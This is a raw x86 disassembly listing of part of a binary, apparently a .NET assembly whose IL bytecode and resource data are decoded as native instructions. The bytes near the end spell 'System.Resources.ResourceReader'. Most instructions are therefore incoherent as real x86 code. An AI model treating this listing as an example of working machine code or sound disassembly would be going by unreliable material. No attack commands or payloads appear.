  403917:	add    BYTE PTR [edx],cl
  403919:	add    ebp,DWORD PTR [edi-0x4d]
  40391c:	add    BYTE PTR [eax],al
  40391e:	or     cl,BYTE PTR [edx]
  403920:	push   es
  403921:	sub    al,0x5
  403923:	push   es
  403924:	mov    gs,WORD PTR [ecx+0x2d]
  403927:	add    al,BYTE PTR [edx+ebp*1]
  40392a:	push   es
  40392b:	push   ss
  40392c:	call   0x330:0x1300002a
  403933:	add    BYTE PTR [esi],ch
  403935:	add    BYTE PTR [eax],al
  403937:	add    BYTE PTR [eax+eax*1],dl
  40393a:	add    BYTE PTR [ecx],dl
  40393c:	add    al,0x2d
  40393e:	add    DWORD PTR [edx],ebp
  403940:	add    al,0x28
  403942:	mov    ah,0x0
  403944:	add    BYTE PTR [edx],cl
  403946:	or     al,BYTE PTR [esi]
  403948:	sub    BYTE PTR [eax],bl
  40394a:	add    BYTE PTR [eax],al
  40394c:	or     ch,BYTE PTR ds:0x7a28061a
  403952:	add    BYTE PTR [eax],al
  403954:	or     ch,BYTE PTR ds:0x28030612
  40395a:	fwait
  40395b:	add    BYTE PTR [eax],al
  40395d:	push   es
  40395e:	and    BYTE PTR [ebx+ebx*1+0x0],ch
  403962:	add    BYTE PTR [ebx-0x56],dh
  403965:	add    BYTE PTR [eax],al
  403967:	push   es
  403968:	jp     0x403994
  40396a:	add    BYTE PTR [eax],al
  40396c:	adc    esi,DWORD PTR [eax]
  40396e:	add    eax,DWORD PTR [eax]
  403970:	add    BYTE PTR es:[eax],al
  403973:	add    BYTE PTR [eax+eax*1],dl
  403976:	add    BYTE PTR [ecx],dl
  403978:	add    al,0x2d
  40397a:	add    DWORD PTR [edx],ebp
  40397c:	add    al,0x28
  40397e:	mov    ch,0x0
  403980:	add    BYTE PTR [edx],cl
  403982:	or     al,BYTE PTR [esi]
  403984:	sub    BYTE PTR [eax],bl
  403986:	add    BYTE PTR [eax],al
  403988:	or     ch,BYTE PTR [edx+edx*1]
  40398b:	add    al,0x3
  40398d:	sub    BYTE PTR [edx+0x20060000],bl
  403993:	ins    DWORD PTR es:[edi],dx
  403994:	sbb    eax,DWORD PTR [eax]
  403996:	add    BYTE PTR [ebx-0x56],dh
  403999:	add    BYTE PTR [eax],al
  40399b:	push   es
  40399c:	jp     0x4039c8
  40399e:	mov    esi,0x547d1b02
  4039a3:	add    BYTE PTR [eax],al
  4039a5:	add    al,0x2
  4039a7:	jb     0x40396e
  4039a9:	add    BYTE PTR [eax],al
  4039ab:	jo     0x403a1f
  4039ad:	retf   
  4039ae:	add    BYTE PTR [eax],al
  4039b0:	jo     0x403a24
  4039b2:	xor    eax,0x73700001
  4039b7:	dec    eax
  4039b8:	add    BYTE PTR [eax],al
  4039ba:	push   es
  4039bb:	jge    0x403a14
  4039bd:	add    BYTE PTR [eax],al
  4039bf:	add    al,0x2
  4039c1:	pop    ss
  4039c2:	jge    0x403a1d
  4039c4:	add    BYTE PTR [eax],al
  4039c6:	add    al,0x2
  4039c8:	sub    BYTE PTR [eax+eax*1],dh
  4039cb:	add    BYTE PTR [esi],al
  4039cd:	sub    al,BYTE PTR [eax]
  4039cf:	add    BYTE PTR [ebx],dl
  4039d1:	xor    BYTE PTR [eax+eax*1],al
  4039d4:	sbb    eax,DWORD PTR [eax]
  4039d6:	add    BYTE PTR [eax],al
  4039d8:	push   ds
  4039d9:	add    BYTE PTR [eax],al
  4039db:	adc    DWORD PTR [edx+0x41],esi
  4039de:	add    DWORD PTR [eax],eax
  4039e0:	jo     0x4039fa
  4039e2:	lea    eax,[edx]
  4039e4:	add    BYTE PTR [eax],al
  4039e6:	add    DWORD PTR [edx],ecx
  4039e8:	push   es
  4039e9:	push   ss
  4039ea:	add    ah,BYTE PTR [edx-0x5dfce8fa]
  4039f0:	push   es
  4039f1:	sub    BYTE PTR [ebx+0x2a060000],dh
  4039f7:	add    BYTE PTR [ebx],dl
  4039f9:	xor    BYTE PTR [eax+eax*1],al
  4039fc:	pop    ss
  4039fd:	add    BYTE PTR [eax],al
  4039ff:	add    BYTE PTR [esi],bl
  403a01:	add    BYTE PTR [eax],al
  403a03:	adc    DWORD PTR [edx+0x61],esi
  403a06:	add    DWORD PTR [eax],eax
  403a08:	jo     0x403a21
  403a0a:	lea    eax,[edx]
  403a0c:	add    BYTE PTR [eax],al
  403a0e:	add    DWORD PTR [edx],ecx
  403a10:	push   es
  403a11:	push   ss
  403a12:	add    ah,BYTE PTR [edx+0xb32806]
  403a18:	add    BYTE PTR [esi],al
  403a1a:	sub    ch,BYTE PTR [esi]
  403a1c:	jb     0x403a95
  403a1e:	add    DWORD PTR [eax],eax
  403a20:	jo     0x403a4a
  403a22:	mov    ah,0x0
  403a24:	add    BYTE PTR [esi],al
  403a26:	sub    al,BYTE PTR [eax]
  403a28:	adc    esi,DWORD PTR [eax]
  403a2a:	add    al,0x0
  403a2c:	sbb    eax,DWORD PTR [eax]
  403a2e:	add    BYTE PTR [eax],al
  403a30:	push   ds
  403a31:	add    BYTE PTR [eax],al
  403a33:	adc    DWORD PTR [edx-0x5b],esi
  403a36:	add    DWORD PTR [eax],eax
  403a38:	jo     0x403a52
  403a3a:	lea    eax,[edx]
  403a3c:	add    BYTE PTR [eax],al
  403a3e:	add    DWORD PTR [edx],ecx
  403a40:	push   es
  403a41:	push   ss
  403a42:	add    ah,BYTE PTR [edx-0x5dfce8fa]
  403a48:	push   es
  403a49:	sub    BYTE PTR [ebx+0x2a060000],dh
  403a4f:	add    BYTE PTR [ebx],dl
  403a51:	xor    BYTE PTR [eax+eax*1],al
  403a54:	sbb    eax,DWORD PTR [eax]
  403a56:	add    BYTE PTR [eax],al
  403a58:	push   ds
  403a59:	add    BYTE PTR [eax],al
  403a5b:	adc    DWORD PTR [edx-0x35],esi
  403a5e:	add    DWORD PTR [eax],eax
  403a60:	jo     0x403a7a
  403a62:	lea    eax,[edx]
  403a64:	add    BYTE PTR [eax],al
  403a66:	add    DWORD PTR [edx],ecx
  403a68:	push   es
  403a69:	push   ss
  403a6a:	add    ah,BYTE PTR [edx-0x5dfce8fa]
  403a70:	push   es
  403a71:	sub    BYTE PTR [ebx+0x2a060000],dh
  403a77:	add    BYTE PTR [ebx],dl
  403a79:	xor    BYTE PTR [eax+eax*1],al
  403a7c:	sbb    eax,DWORD PTR [eax]
  403a7e:	add    BYTE PTR [eax],al
  403a80:	push   ds
  403a81:	add    BYTE PTR [eax],al
  403a83:	adc    DWORD PTR [edx-0x9],esi
  403a86:	add    DWORD PTR [eax],eax
  403a88:	jo     0x403aa2
  403a8a:	lea    eax,[edx]
  403a8c:	add    BYTE PTR [eax],al
  403a8e:	add    DWORD PTR [edx],ecx
  403a90:	push   es
  403a91:	push   ss
  403a92:	add    ah,BYTE PTR [edx-0x5dfce8fa]
  403a98:	push   es
  403a99:	sub    BYTE PTR [ebx+0x2a060000],dh
  403a9f:	add    BYTE PTR [ebx],dl
  403aa1:	xor    BYTE PTR [eax+eax*1],al
  403aa4:	sbb    eax,DWORD PTR [eax]
  403aa6:	add    BYTE PTR [eax],al
  403aa8:	push   ds
  403aa9:	add    BYTE PTR [eax],al
  403aab:	adc    DWORD PTR [edx+0x19],esi
  403aae:	add    al,BYTE PTR [eax]
  403ab0:	jo     0x403aca
  403ab2:	lea    eax,[edx]
  403ab4:	add    BYTE PTR [eax],al
  403ab6:	add    DWORD PTR [edx],ecx
  403ab8:	push   es
  403ab9:	push   ss
  403aba:	add    ah,BYTE PTR [edx-0x5dfce8fa]
  403ac0:	push   es
  403ac1:	sub    BYTE PTR [ebx+0x2a060000],dh
  403ac7:	cs jb  0x403b1d
  403aca:	add    al,BYTE PTR [eax]
  403acc:	jo     0x403af6
  403ace:	mov    ah,0x0
  403ad0:	add    BYTE PTR [esi],al
  403ad2:	sub    ch,BYTE PTR [esi]
  403ad4:	jb     0x403b51
  403ad6:	add    al,BYTE PTR [eax]
  403ad8:	jo     0x403b02
  403ada:	mov    ah,0x0
  403adc:	add    BYTE PTR [esi],al
  403ade:	sub    ch,BYTE PTR [esi]
  403ae0:	jb     0x403a87
  403ae2:	add    al,BYTE PTR [eax]
  403ae4:	jo     0x403b0e
  403ae6:	mov    ah,0x0
  403ae8:	add    BYTE PTR [esi],al
  403aea:	sub    ch,BYTE PTR [esi]
  403aec:	jb     0x403ac1
  403aee:	add    al,BYTE PTR [eax]
  403af0:	jo     0x403b1a
  403af2:	mov    ah,0x0
  403af4:	add    BYTE PTR [esi],al
  403af6:	sub    ch,BYTE PTR [esi]
  403af8:	jb     0x403b0b
  403afa:	add    eax,DWORD PTR [eax]
  403afc:	jo     0x403b26
  403afe:	mov    ah,0x0
  403b00:	add    BYTE PTR [esi],al
  403b02:	sub    ch,BYTE PTR [esi]
  403b04:	jb     0x403b55
  403b06:	add    eax,DWORD PTR [eax]
  403b08:	jo     0x403b32
  403b0a:	mov    ah,0x0
  403b0c:	add    BYTE PTR [esi],al
  403b0e:	sub    ch,BYTE PTR [esi]
  403b10:	jb     0x403a97
  403b12:	add    eax,DWORD PTR [eax]
  403b14:	jo     0x403b3e
  403b16:	mov    ah,0x0
  403b18:	add    BYTE PTR [esi],al
  403b1a:	sub    ch,BYTE PTR [esi]
  403b1c:	jb     0x403ad1
  403b1e:	add    eax,DWORD PTR [eax]
  403b20:	jo     0x403b4a
  403b22:	mov    ah,0x0
  403b24:	add    BYTE PTR [esi],al
  403b26:	sub    ch,BYTE PTR [esi]
  403b28:	jb     0x403b01
  403b2a:	add    eax,DWORD PTR [eax]
  403b2c:	jo     0x403b56
  403b2e:	mov    ah,0x0
  403b30:	add    BYTE PTR [esi],al
  403b32:	sub    ch,BYTE PTR [esi]
  403b34:	jb     0x403b33
  403b36:	add    eax,DWORD PTR [eax]
  403b38:	jo     0x403b62
  403b3a:	mov    ah,0x0
  403b3c:	add    BYTE PTR [esi],al
  403b3e:	sub    ch,BYTE PTR [esi]
  403b40:	jb     0x403b75
  403b42:	add    al,0x0
  403b44:	jo     0x403b6e
  403b46:	mov    ah,0x0
  403b48:	add    BYTE PTR [esi],al
  403b4a:	sub    ch,BYTE PTR [esi]
  403b4c:	jb     0x403ba5
  403b4e:	add    al,0x0
  403b50:	jo     0x403b7a
  403b52:	mov    ah,0x0
  403b54:	add    BYTE PTR [esi],al
  403b56:	sub    ch,BYTE PTR [esi]
  403b58:	jb     0x403bd5
  403b5a:	add    al,0x0
  403b5c:	jo     0x403b86
  403b5e:	mov    ah,0x0
  403b60:	add    BYTE PTR [esi],al
  403b62:	sub    al,BYTE PTR [eax]
  403b64:	adc    esi,DWORD PTR [eax]
  403b66:	add    al,0x0
  403b68:	pop    ss
  403b69:	add    BYTE PTR [eax],al
  403b6b:	add    BYTE PTR [esi],bl
  403b6d:	add    BYTE PTR [eax],al
  403b6f:	adc    DWORD PTR [edx-0x6b],esi
  403b72:	add    al,0x0
  403b74:	jo     0x403b8d
  403b76:	lea    eax,[edx]
  403b78:	add    BYTE PTR [eax],al
  403b7a:	add    DWORD PTR [edx],ecx
  403b7c:	push   es
  403b7d:	push   ss
  403b7e:	add    ah,BYTE PTR [edx+0xb32806]
  403b84:	add    BYTE PTR [esi],al
  403b86:	sub    ch,BYTE PTR [esi]
  403b88:	jb     0x403b31
  403b8a:	add    al,0x0
  403b8c:	jo     0x403bb6
  403b8e:	mov    ah,0x0
  403b90:	add    BYTE PTR [esi],al
  403b92:	sub    al,BYTE PTR [eax]
  403b94:	adc    esi,DWORD PTR [eax]
  403b96:	add    al,0x0
  403b98:	pop    ss
  403b99:	add    BYTE PTR [eax],al
  403b9b:	add    BYTE PTR [esi],bl
  403b9d:	add    BYTE PTR [eax],al
  403b9f:	adc    DWORD PTR [edx-0x31],esi
  403ba2:	add    al,0x0
  403ba4:	jo     0x403bbd
  403ba6:	lea    eax,[edx]
  403ba8:	add    BYTE PTR [eax],al
  403baa:	add    DWORD PTR [edx],ecx
  403bac:	push   es
  403bad:	push   ss
  403bae:	add    ah,BYTE PTR [edx+0xb32806]
  403bb4:	add    BYTE PTR [esi],al
  403bb6:	sub    ch,BYTE PTR [esi]
  403bb8:	jb     0x403b9b
  403bba:	add    al,0x0
  403bbc:	jo     0x403be6
  403bbe:	mov    ah,0x0
  403bc0:	add    BYTE PTR [esi],al
  403bc2:	sub    al,BYTE PTR [eax]
  403bc4:	adc    esi,DWORD PTR [eax]
  403bc6:	add    al,0x0
  403bc8:	pop    ss
  403bc9:	add    BYTE PTR [eax],al
  403bcb:	add    BYTE PTR [esi],bl
  403bcd:	add    BYTE PTR [eax],al
  403bcf:	adc    DWORD PTR [edx+0x9],esi
  403bd2:	add    eax,0x8d177000
  403bd7:	add    al,BYTE PTR [eax]
  403bd9:	add    BYTE PTR [ecx],al
  403bdb:	or     al,BYTE PTR [esi]
  403bdd:	push   ss
  403bde:	add    ah,BYTE PTR [edx+0xb32806]
  403be4:	add    BYTE PTR [esi],al
  403be6:	sub    ch,BYTE PTR [esi]
  403be8:	jb     0x403c05
  403bea:	add    eax,0xb4287000
  403bef:	add    BYTE PTR [eax],al
  403bf1:	push   es
  403bf2:	sub    ch,BYTE PTR [esi]
  403bf4:	jb     0x403c39
  403bf6:	add    eax,0xb4287000
  403bfb:	add    BYTE PTR [eax],al
  403bfd:	push   es
  403bfe:	sub    al,BYTE PTR [eax]
  403c00:	adc    esi,DWORD PTR [eax]
  403c02:	add    al,0x0
  403c04:	pop    ss
  403c05:	add    BYTE PTR [eax],al
  403c07:	add    BYTE PTR [esi],bl
  403c09:	add    BYTE PTR [eax],al
  403c0b:	adc    DWORD PTR [edx+0x5b],esi
  403c0e:	add    eax,0x8d177000
  403c13:	add    al,BYTE PTR [eax]
  403c15:	add    BYTE PTR [ecx],al
  403c17:	or     al,BYTE PTR [esi]
  403c19:	push   ss
  403c1a:	add    ah,BYTE PTR [edx+0xb32806]
  403c20:	add    BYTE PTR [esi],al
  403c22:	sub    al,BYTE PTR [eax]
  403c24:	adc    esi,DWORD PTR [eax]
  403c26:	add    al,0x0
  403c28:	pop    ss
  403c29:	add    BYTE PTR [eax],al
  403c2b:	add    BYTE PTR [esi],bl
  403c2d:	add    BYTE PTR [eax],al
  403c2f:	adc    DWORD PTR [edx-0x7b],esi
  403c32:	add    eax,0x8d177000
  403c37:	add    al,BYTE PTR [eax]
  403c39:	add    BYTE PTR [ecx],al
  403c3b:	or     al,BYTE PTR [esi]
  403c3d:	push   ss
  403c3e:	add    ah,BYTE PTR [edx+0xb32806]
  403c44:	add    BYTE PTR [esi],al
  403c46:	sub    al,BYTE PTR [eax]
  403c48:	adc    esi,DWORD PTR [eax]
  403c4a:	add    al,0x0
  403c4c:	pop    ds
  403c4d:	add    BYTE PTR [eax],al
  403c4f:	add    BYTE PTR [esi],bl
  403c51:	add    BYTE PTR [eax],al
  403c53:	adc    DWORD PTR [edx-0x55],esi
  403c56:	add    eax,0x8d197000
  403c5b:	add    al,BYTE PTR [eax]
  403c5d:	add    BYTE PTR [ecx],al
  403c5f:	or     al,BYTE PTR [esi]
  403c61:	push   ss
  403c62:	add    ah,BYTE PTR [edx-0x5dfce8fa]
  403c68:	push   es
  403c69:	sbb    BYTE PTR [edx+eiz*4],al
  403c6c:	push   es
  403c6d:	sub    BYTE PTR [ebx+0x2a060000],dh
  403c73:	add    BYTE PTR [ebx],dl
  403c75:	xor    BYTE PTR [eax+eax*1],al
  403c78:	pop    ss
  403c79:	add    BYTE PTR [eax],al
  403c7b:	add    BYTE PTR [esi],bl
  403c7d:	add    BYTE PTR [eax],al
  403c7f:	adc    DWORD PTR [edx-0x29],esi
  403c82:	add    eax,0x8d177000
  403c87:	add    al,BYTE PTR [eax]
  403c89:	add    BYTE PTR [ecx],al
  403c8b:	or     al,BYTE PTR [esi]
  403c8d:	push   ss
  403c8e:	add    ah,BYTE PTR [edx+0xb32806]
  403c94:	add    BYTE PTR [esi],al
  403c96:	sub    al,BYTE PTR [eax]
  403c98:	adc    esi,DWORD PTR [eax]
  403c9a:	add    al,0x0
  403c9c:	pop    ss
  403c9d:	add    BYTE PTR [eax],al
  403c9f:	add    BYTE PTR [esi],bl
  403ca1:	add    BYTE PTR [eax],al
  403ca3:	adc    DWORD PTR [edx-0x5],esi
  403ca6:	add    eax,0x8d177000
  403cab:	add    al,BYTE PTR [eax]
  403cad:	add    BYTE PTR [ecx],al
  403caf:	or     al,BYTE PTR [esi]
  403cb1:	push   ss
  403cb2:	add    ah,BYTE PTR [edx+0xb32806]
  403cb8:	add    BYTE PTR [esi],al
  403cba:	sub    al,BYTE PTR [eax]
  403cbc:	adc    esi,DWORD PTR [eax]
  403cbe:	add    al,0x0
  403cc0:	sbb    eax,DWORD PTR [eax]
  403cc2:	add    BYTE PTR [eax],al
  403cc4:	push   ds
  403cc5:	add    BYTE PTR [eax],al
  403cc7:	adc    DWORD PTR [edx+0x25],esi
  403cca:	push   es
  403ccb:	add    BYTE PTR [eax+0x18],dh
  403cce:	lea    eax,[edx]
  403cd0:	add    BYTE PTR [eax],al
  403cd2:	add    DWORD PTR [edx],ecx
  403cd4:	push   es
  403cd5:	push   ss
  403cd6:	add    ah,BYTE PTR [edx-0x5dfce8fa]
  403cdc:	push   es
  403cdd:	sub    BYTE PTR [ebx+0x2a060000],dh
  403ce3:	add    BYTE PTR [ebx],dl
  403ce5:	xor    BYTE PTR [eax+eax*1],al
  403ce8:	sbb    eax,DWORD PTR [eax]
  403cea:	add    BYTE PTR [eax],al
  403cec:	push   ds
  403ced:	add    BYTE PTR [eax],al
  403cef:	adc    DWORD PTR [edx+0x45],esi
  403cf2:	push   es
  403cf3:	add    BYTE PTR [eax+0x18],dh
  403cf6:	lea    eax,[edx]
  403cf8:	add    BYTE PTR [eax],al
  403cfa:	add    DWORD PTR [edx],ecx
  403cfc:	push   es
  403cfd:	push   ss
  403cfe:	add    ah,BYTE PTR [edx-0x5dfce8fa]
  403d04:	push   es
  403d05:	sub    BYTE PTR [ebx+0x2a060000],dh
  403d0b:	add    BYTE PTR [ebx],dl
  403d0d:	xor    BYTE PTR [eax+eax*1],al
  403d10:	sbb    eax,DWORD PTR [eax]
  403d12:	add    BYTE PTR [eax],al
  403d14:	push   ds
  403d15:	add    BYTE PTR [eax],al
  403d17:	adc    DWORD PTR [edx+0x7f],esi
  403d1a:	push   es
  403d1b:	add    BYTE PTR [eax+0x18],dh
  403d1e:	lea    eax,[edx]
  403d20:	add    BYTE PTR [eax],al
  403d22:	add    DWORD PTR [edx],ecx
  403d24:	push   es
  403d25:	push   ss
  403d26:	add    ah,BYTE PTR [edx-0x5dfce8fa]
  403d2c:	push   es
  403d2d:	sub    BYTE PTR [ebx+0x2a060000],dh
  403d33:	add    BYTE PTR [ebx],dl
  403d35:	xor    BYTE PTR [eax+eax*1],al
  403d38:	pop    ds
  403d39:	add    BYTE PTR [eax],al
  403d3b:	add    BYTE PTR [esi],bl
  403d3d:	add    BYTE PTR [eax],al
  403d3f:	adc    DWORD PTR [edx-0x53],esi
  403d42:	push   es
  403d43:	add    BYTE PTR [eax+0x19],dh
  403d46:	lea    eax,[edx]
  403d48:	add    BYTE PTR [eax],al
  403d4a:	add    DWORD PTR [edx],ecx
  403d4c:	push   es
  403d4d:	push   ss
  403d4e:	add    ah,BYTE PTR [edx-0x5dfce8fa]
  403d54:	push   es
  403d55:	sbb    BYTE PTR [edx+eiz*4],al
  403d58:	push   es
  403d59:	sub    BYTE PTR [ebx+0x2a060000],dh
  403d5f:	cs jb  0x403d2f
  403d62:	push   es
  403d63:	add    BYTE PTR [eax+0x28],dh
  403d66:	mov    ah,0x0
  403d68:	add    BYTE PTR [esi],al
  403d6a:	sub    ch,BYTE PTR [esi]
  403d6c:	jb     0x403d73
  403d6e:	pop    es
  403d6f:	add    BYTE PTR [eax+0x28],dh
  403d72:	mov    ah,0x0
  403d74:	add    BYTE PTR [esi],al
  403d76:	sub    ch,BYTE PTR [esi]
  403d78:	jb     0x403dbb
  403d7a:	pop    es
  403d7b:	add    BYTE PTR [eax+0x28],dh
  403d7e:	mov    ah,0x0
  403d80:	add    BYTE PTR [esi],al
  403d82:	sub    ch,BYTE PTR [esi]
  403d84:	jb     0x403e03
  403d86:	pop    es
  403d87:	add    BYTE PTR [eax+0x28],dh
  403d8a:	mov    ah,0x0
  403d8c:	add    BYTE PTR [esi],al
  403d8e:	sub    al,BYTE PTR [eax]
  403d90:	adc    esi,DWORD PTR [eax]
  403d92:	add    al,0x0
  403d94:	sbb    eax,DWORD PTR [eax]
  403d96:	add    BYTE PTR [eax],al
  403d98:	push   ds
  403d99:	add    BYTE PTR [eax],al
  403d9b:	adc    DWORD PTR [edx-0x6b],esi
  403d9e:	pop    es
  403d9f:	add    BYTE PTR [eax+0x18],dh
  403da2:	lea    eax,[edx]
  403da4:	add    BYTE PTR [eax],al
  403da6:	add    DWORD PTR [edx],ecx
  403da8:	push   es
  403da9:	push   ss
  403daa:	add    ah,BYTE PTR [edx-0x5dfce8fa]
  403db0:	push   es
  403db1:	sub    BYTE PTR [ebx+0x2a060000],dh
  403db7:	add    BYTE PTR [ebx],dl
  403db9:	xor    BYTE PTR [eax+eax*1],al
  403dbc:	pop    ds
  403dbd:	add    BYTE PTR [eax],al
  403dbf:	add    BYTE PTR [esi],bl
  403dc1:	add    BYTE PTR [eax],al
  403dc3:	adc    DWORD PTR [edx-0x3f],esi
  403dc6:	pop    es
  403dc7:	add    BYTE PTR [eax+0x19],dh
  403dca:	lea    eax,[edx]
  403dcc:	add    BYTE PTR [eax],al
  403dce:	add    DWORD PTR [edx],ecx
  403dd0:	push   es
  403dd1:	push   ss
  403dd2:	add    ah,BYTE PTR [edx-0x5dfce8fa]
  403dd8:	push   es
  403dd9:	sbb    BYTE PTR [edx+eiz*4],al
  403ddc:	push   es
  403ddd:	sub    BYTE PTR [ebx+0x2a060000],dh
  403de3:	cs jb  0x403dd9
  403de6:	pop    es
  403de7:	add    BYTE PTR [eax+0x28],dh
  403dea:	mov    ah,0x0
  403dec:	add    BYTE PTR [esi],al
  403dee:	sub    ch,BYTE PTR [esi]
  403df0:	jb     0x403dff
  403df2:	or     BYTE PTR [eax],al
  403df4:	jo     0x403e1e
  403df6:	mov    ah,0x0
  403df8:	add    BYTE PTR [esi],al
  403dfa:	sub    bl,BYTE PTR [esi]
  403dfc:	add    dh,BYTE PTR [ebx-0x4a]
  403dff:	add    BYTE PTR [eax],al
  403e01:	or     ch,BYTE PTR [edx]
  403e03:	push   ds
  403e04:	add    dh,BYTE PTR [ebx-0x49]
  403e07:	add    BYTE PTR [eax],al
  403e09:	or     ch,BYTE PTR [edx]
  403e0b:	sbb    dh,BYTE PTR [ebx-0x48]
  403e0e:	add    BYTE PTR [eax],al
  403e10:	or     ch,BYTE PTR [edx]
  403e12:	sbb    dh,BYTE PTR [ebx-0x47]
  403e15:	add    BYTE PTR [eax],al
  403e17:	or     ch,BYTE PTR [edx]
  403e19:	add    al,BYTE PTR ds:[ebx]
  403e1c:	sub    BYTE PTR [edx+0x20a0000],bh
  403e22:	add    al,0x7d
  403e24:	pop    edi
  403e25:	add    BYTE PTR [eax],al
  403e27:	add    al,0x2a
  403e29:	push   ds
  403e2a:	add    bh,BYTE PTR [ebx+0x5f]
  403e2d:	add    BYTE PTR [eax],al
  403e2f:	add    al,0x2a
  403e31:	and    al,BYTE PTR [edx]
  403e33:	add    ebp,DWORD PTR [eax]
  403e35:	mov    ebx,0x2a0a0000
  403e3a:	sahf   
  403e3b:	add    bh,BYTE PTR [ebx-0x63]
  403e3e:	add    BYTE PTR [eax],al
  403e40:	add    al,0x2d
  403e42:	sbb    BYTE PTR [edx],al
  403e44:	pop    ss
  403e45:	jge    0x403de4
  403e47:	add    BYTE PTR [eax],al
  403e49:	add    al,0x2
  403e4b:	add    ch,BYTE PTR [eax]
  403e4d:	mov    esp,0x280a0000
  403e52:	mov    ah,0x0
  403e54:	add    BYTE PTR [esi],al
  403e56:	sub    BYTE PTR [ebp+0x20a0000],bh
  403e5c:	sub    BYTE PTR [eax+eax*1+0x222a0a00],bh
  403e63:	add    al,BYTE PTR [ebx]
  403e65:	sub    BYTE PTR [esi+0x2a0a0000],bh
  403e6b:	push   ds
  403e6c:	add    ebp,DWORD PTR [eax]
  403e6e:	mov    ah,0x0
  403e70:	add    BYTE PTR [esi],al
  403e72:	sub    cl,BYTE PTR [edx+0x192802]
  403e78:	add    BYTE PTR [edx],cl
  403e7a:	add    dh,BYTE PTR [edx+0x6b]
  403e7d:	or     BYTE PTR [eax],al
  403e7f:	jo     0x403e83
  403e81:	sub    BYTE PTR [edi+0x0],al
  403e84:	add    BYTE PTR [edx],cl
  403e86:	outs   dx,DWORD PTR ds:[esi]
  403e87:	mov    edi,0x730a0000
  403e8c:	rol    BYTE PTR [eax],0x0
  403e8f:	or     bh,BYTE PTR [ebp-0x35]
  403e92:	add    BYTE PTR [eax],al
  403e94:	add    al,0x2a
  403e96:	add    BYTE PTR [eax],al
  403e98:	adc    esi,DWORD PTR [eax]
  403e9a:	add    eax,DWORD PTR [eax]
  403e9c:	and    BYTE PTR [eax],al
  403e9e:	add    BYTE PTR [eax],al
  403ea0:	pop    ds
  403ea1:	add    BYTE PTR [eax],al
  403ea3:	adc    DWORD PTR [esi-0x36],edi
  403ea6:	add    BYTE PTR [eax],al
  403ea8:	add    al,0x2d
  403eaa:	adc    esi,DWORD PTR [ebx-0x50]
  403ead:	add    BYTE PTR [eax],al
  403eaf:	push   es
  403eb0:	or     bh,BYTE PTR [edi-0x36]
  403eb3:	add    BYTE PTR [eax],al
  403eb5:	add    al,0x6
  403eb7:	adc    al,0x28
  403eb9:	add    al,0x0
  403ebb:	add    BYTE PTR [ebx],ch
  403ebd:	es jle 0x403e8a
  403ec0:	add    BYTE PTR [eax],al
  403ec2:	add    al,0x2a
  403ec4:	or     dl,BYTE PTR [edx+ebp*1]
  403ec7:	add    BYTE PTR [ebx],dl
  403ec9:	xor    BYTE PTR ds:0x7500,al
  403ecf:	add    BYTE PTR [eax],ah
  403ed1:	add    BYTE PTR [eax],al
  403ed3:	adc    DWORD PTR [eax],ebp
  403ed5:	mov    cl,0x0
  403ed7:	add    BYTE PTR [esi],al
  403ed9:	or     al,BYTE PTR [esi]
  403edb:	sub    eax,0x62a1402
  403ee0:	jnp    0x403ead
  403ee2:	add    BYTE PTR [eax],al
  403ee4:	add    al,0x2
  403ee6:	sub    BYTE PTR [edx+0x6f060000],dh
  403eec:	ret    0x0
  403eef:	or     cl,BYTE PTR [ebx]
  403ef1:	add    ebp,DWORD PTR [ebx+edx*2]
  403ef4:	add    ecx,DWORD PTR [esi+0x4d311669]
  403efa:	push   ss
  403efb:	or     al,0x2b
  403efd:	add    ecx,DWORD PTR ss:[eax]
  403f00:	call   0xd01:0x3475
  403f07:	or     DWORD PTR [esi+eiz*1],ebp
  403f0a:	or     DWORD PTR [edi+0x3f],ebp
  403f0d:	add    BYTE PTR [eax],al
  403f0f:	or     ah,BYTE PTR [eax]
  403f11:	add    BYTE PTR [eax+eax*1],al
  403f14:	add    BYTE PTR [ecx],dh
  403f16:	sbb    DWORD PTR [ebx],eax
  403f18:	or     BYTE PTR [ecx],cl
  403f1a:	push   ss
  403f1b:	and    ch,bh
  403f1d:	add    eax,DWORD PTR [eax]
  403f1f:	add    BYTE PTR [edi+0x43],ch
  403f22:	add    BYTE PTR [eax],al
  403f24:	or     dh,BYTE PTR [edx-0x7d]
  403f27:	or     BYTE PTR [eax],al
  403f29:	jo     0x403f53
  403f2b:	push   eax
  403f2c:	add    BYTE PTR [eax],al
  403f2e:	or     ah,BYTE PTR [edx+0xc581708]
  403f34:	or     BYTE PTR [ebx],al
  403f36:	mov    gs,WORD PTR [ecx+0x32]
  403f39:	les    ebp,FWORD PTR [eax]
  403f3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f3c:	add    BYTE PTR [eax],al
  403f3e:	or     al,BYTE PTR [edi]
  403f40:	add    ebp,DWORD PTR [eax]
  403f42:	test   al,0x0
  403f44:	add    BYTE PTR [edx],cl
  403f46:	sub    al,BYTE PTR [edi]
  403f48:	sub    al,BYTE PTR [eax]
  403f4a:	add    BYTE PTR [eax],al
  403f4c:	adc    esi,DWORD PTR [eax]
  403f4e:	add    eax,DWORD PTR [eax]
  403f50:	sbb    eax,0x1f000000
  403f55:	add    BYTE PTR [eax],al
  403f57:	adc    DWORD PTR [eax],ebp
  403f59:	mov    cl,0x0
  403f5b:	add    BYTE PTR [esi],al
  403f5d:	or     al,BYTE PTR [esi]
  403f5f:	sub    eax,0x62a1402
  403f64:	jnp    0x403f31
  403f66:	add    BYTE PTR [eax],al
  403f68:	add    al,0x2
  403f6a:	sub    BYTE PTR [edx+0x6f060000],dh
  403f70:	ret    0x0
  403f73:	or     ch,BYTE PTR [edx]
  403f75:	add    BYTE PTR [eax],al
  403f77:	add    BYTE PTR [edx+0x13],cl
  403f7a:	add    BYTE PTR [eax],al
  403f7c:	into   
  403f7d:	retf   0xbeef
  403f80:	add    DWORD PTR [eax],eax
  403f82:	add    BYTE PTR [eax],al
  403f84:	xchg   ecx,eax
  403f85:	add    BYTE PTR [eax],al
  403f87:	add    BYTE PTR [ebx+edx*2+0x79],ch
  403f8b:	jae    0x404001
  403f8d:	gs ins DWORD PTR es:[edi],dx
  403f8f:	cs push edx
  403f91:	gs jae 0x404003
  403f94:	jne    0x404008
  403f96:	arpl   WORD PTR [ebp+0x73],sp
  403f99:	cs push edx
  403f9b:	gs jae 0x40400d
  403f9e:	jne    0x404012
  403fa0:	arpl   WORD PTR [ebp+0x52],sp
  403fa3:	gs popa 
  403fa5:	fs gs jb 0x403fd5
  403fa9:	and    BYTE PTR [ebp+0x73],ch
